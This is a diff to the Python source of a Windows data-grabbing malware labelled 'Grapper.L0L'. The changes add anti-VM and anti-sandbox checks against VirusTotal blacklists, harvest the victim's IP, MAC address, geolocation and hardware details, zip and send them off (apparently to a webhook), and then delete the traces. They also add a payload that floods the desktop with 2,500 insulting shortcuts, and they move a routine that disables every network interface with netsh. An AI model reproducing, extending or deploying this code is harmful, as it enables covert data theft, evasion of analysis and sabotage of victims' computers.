@@ -15,6 +15,7 @@ play_music = False
 fuck_internet = False
 black_screen = False
 fuck_input = False
+shortcut_spam = False
 
 
 import os
@@ -35,12 +36,13 @@ try:
     import pygame
     import zipfile
     import tkinter as tk
+    import win32com.client
+    import uuid
 
 except Exception as e:
     if hide:
-        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
-        ctypes.windll.user32.MoveWindow(hwnd, 50000, 500000, 800, 600, True)
-    for pac in ["requests","psutil","pyautogui","pygame"]:
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 5)
+    for pac in ["requests","psutil","pyautogui","pygame","pywin32"]:
         os.system(f"pip install -q {pac}")
     import requests
     import psutil
@@ -58,6 +60,8 @@ except Exception as e:
     import pygame
     import zipfile
     import tkinter as tk
+    import win32com.client
+    import uuid
 
 os.system("cls")
 class util:
@@ -98,9 +102,17 @@ class anti:
         data = data.text
         if user in data:
             return True
+        data = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt")
+        data = data.text
+        if user in data:
+            return True
         
         name = socket.gethostname()
         data = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt")
+        data = data.text
+        if name in data:
+            return True
+        data = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt")
         data = data.text
         if name in data:
             return True
@@ -113,24 +125,6 @@ class anti:
 wb = ''
 
 def send_embed():
-    config = f"""
-anti VM = {anti_vm}
-anti Virustotal = {anti_vt}
-anti any.run = {anti_arun}
-auto destrct = {destruct}
-hide = {hide}
-screenshoot = {ss}
-startup = {startup}
-connection info fetcher = {con_info}
-pc info fetcher = {pc_info}
-clipboard stealer = {steal_clipboard}
-file download = {down_file}
-music player = {play_music}
-
-internet fucker = {fuck_internet}
-black screen = {black_screen}
-input blocker = {fuck_input}
-"""
     try:
         embed = {
             "title": "Grapper.L0L",
@@ -138,7 +132,6 @@ input blocker = {fuck_input}
             "fields": [
                 {"name": " 🔎 OS", "value": f"{platform.platform()}", "inline": False},
                 {"name": " 👤 Win user", "value": f"{os.getlogin()}", "inline": False},
-                {"name": " ⚙ Config", "value": f"{config}", "inline": False},
 
             ],
         }
@@ -285,20 +278,26 @@ while __name__ == "__main__":
                 ipcfgdata = "Failed to fetch"
             r = requests.get("https://ipinfo.io/")
             data = f"""
-    ip: {r.json().get('ip')}
-    hostname: {r.json().get('hostname')}
-    city: {r.json().get('city')}
-    region: {r.json().get('region')}
-    country: {r.json().get('country')}
-    location: {r.json().get('loc')}
-    org: {r.json().get('org')}
-    postal: {r.json().get('postal')}
-    timezone: {r.json().get('timezone')}
+                      Fetched
+$$$ --------------------------------------------- $$$
 
-    $$$ --------------------------------------------- $$$
+local ip: {socket.gethostbyname(socket.gethostname())}
+ip: {r.json().get('ip')}
+mac: {':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])}
+hostname: {r.json().get('hostname')}
+city: {r.json().get('city')}
+region: {r.json().get('region')}
+country: {r.json().get('country')}
+location: {r.json().get('loc')}
+org: {r.json().get('org')}
+postal: {r.json().get('postal')}
+timezone: {r.json().get('timezone')}
 
-            {ipcfgdata}
-            """
+$$$ --------------------------------------------- $$$
+                      Windows
+
+{ipcfgdata}
+"""
             with open(f"{folder_name}/connectioninfo.txt", "w") as f:
                 f.write(data)
         except:
@@ -309,37 +308,36 @@ while __name__ == "__main__":
         try:
             os.mkdir(f"{folder_name}/pcinfo")
             system_info = f"""
-    Main       
+Main       
 
-    System: {platform.system()},
-    PC name: {platform.node()},
-    Release: {platform.release()},
-    Version: {platform.version()},
-            """
+System: {platform.system()},
+PC name: {platform.node()},
+Release: {platform.release()},
+Version: {platform.version()},
+"""
 
             cpu_info = f"""
-    CPU
+CPU
 
-    Processor: {platform.processor()}
-    Architecture: {platform.architecture()[0]}
-    Machine: {platform.machine()},
-    Processor: {platform.processor()}
-            """
+Architecture: {platform.architecture()[0]}
+Machine: {platform.machine()},
+Processor: {platform.processor()}
+"""
 
             ram_info = f"""
-    RAM
+RAM
 
-    Total Memory: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB
-    Available Memory: {round(psutil.virtual_memory().available / (1024 ** 3), 2)} GB
-            """
+Total Memory: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB
+Available Memory: {round(psutil.virtual_memory().available / (1024 ** 3), 2)} GB
+"""
 
             disk_info = f"""
-    DISK
+DISK
 
-    Total Disk Space: {round(psutil.disk_usage('/').total / (1024 ** 3), 2)} GB
-    Used Disk Space: {round(psutil.disk_usage('/').used / (1024 ** 3), 2)} GB
-    Free Disk Space: {round(psutil.disk_usage('/').free / (1024 ** 3), 2)} GB
-            """
+Total Disk Space: {round(psutil.disk_usage('/').total / (1024 ** 3), 2)} GB
+Used Disk Space: {round(psutil.disk_usage('/').used / (1024 ** 3), 2)} GB
+Free Disk Space: {round(psutil.disk_usage('/').free / (1024 ** 3), 2)} GB
+"""
 
             data = system_info + cpu_info + ram_info + disk_info
 
@@ -386,14 +384,20 @@ while __name__ == "__main__":
                 time.sleep(1)
         except:
             pass
+    
+    if shortcut_spam:
+        for i in range(2500):
+            try:
+                shell = win32com.client.Dispatch("WScript.Shell")
+                desktop_path = shell.SpecialFolders("Desktop")
+                shortcut_path = os.path.join(desktop_path, f"GetFuckedByR3CI_{i}.lnk")
 
-    if fuck_internet:
-        try:
-            interface_names = list(psutil.net_if_stats().keys())
-            for name in interface_names:
-                os.system(f'netsh interface set interface name="{name}" admin=DISABLED')
-        except:
-            pass
+                shortcut = shell.CreateShortCut(shortcut_path)
+                shortcut.TargetPath = os.path.abspath(__file__)
+                shortcut.WorkingDirectory = os.path.dirname(os.path.abspath(__file__))
+                shortcut.save()
+            except Exception as e:
+                pass
 
     with zipfile.ZipFile(f"{dir.pictures}/{os.getlogin()}.zip", 'w') as zip_file:
         for folder_root, _, files in os.walk(folder_name):
@@ -406,6 +410,14 @@ while __name__ == "__main__":
     time.sleep(3)
     os.remove(f"{dir.pictures}/{os.getlogin()}.zip")
     shutil.rmtree(folder_name)  
+
+    if fuck_internet:
+        try:
+            interface_names = list(psutil.net_if_stats().keys())
+            for name in interface_names:
+                os.system(f'netsh interface set interface name="{name}" admin=DISABLED')
+        except:
+            pass
 
     if destruct:
         util.destruct()
